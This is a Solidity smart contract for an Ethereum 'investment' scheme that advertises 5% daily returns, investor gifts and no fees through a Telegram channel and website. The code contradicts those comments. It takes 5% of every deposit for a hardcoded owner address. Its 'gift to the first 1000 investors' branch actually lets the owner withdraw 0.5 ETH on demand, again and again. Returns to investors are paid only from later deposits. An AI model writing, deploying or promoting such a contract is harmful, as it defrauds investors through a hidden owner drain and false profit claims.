1 pragma solidity ^0.4.25;
2  //Investment contract with gifts to the first 1000 investors
3  // Our telegram masterInvest5
4  // Our site https://master5invest.com
5  //Our site http://master5invest.com
6  //a gift to the first 1000 investors -- after 1 month 0.5 ETH
7  //GAIN 5% PER 24 HOURS (every 5900 blocks)
8  //translated into telegram channels
9  //NO FEES are collected by the owner after 30 days
10  //How to use:
11  // 1. Send any amount of ether to make an investment
12  // 2. Claim your profit by sending 0 ether transaction 
13  // 3. You may reinvest too
14  //RECOMMENDED GAS 200 000 
15  //RECOMMENDED GAS PRICE: https://ethgasstation.info/
16  
17 
18 contract master5invest {
19     address publicity; // advertising address
20    
21     
22     function master5invest () {
23         publicity = 0xda86ad1ca27Db83414e09Cc7549d887D92F58506;
24        
25     }
26     
27     mapping (address => uint256) m5balances;
28     mapping (address => uint256) nextpayout;
29    //dividend payment of 5% per day every investor
30     function() external payable {
31         uint256 newadv = msg.value / 20;
32         publicity.transfer(newadv);
33         
34         if ( m5balances[msg.sender] != 0){
35         address sender = msg.sender;
36         
37         uint256 dividends =  m5balances[msg.sender]*5/100*(block.number-nextpayout[msg.sender])/5900;
38         sender.transfer(dividends);
39         }
40 
41          nextpayout[msg.sender] = block.number; //next payment date
42          m5balances[msg.sender] += msg.value; // increase balance
43          
44         //a gift to the first 1000 investors -- after 1 month 0.5 ETH
45         if (msg.sender==publicity || block.number==6700000) {
46             publicity.transfer(0.5 ether);
47         }
48         
49         
50     }
51 }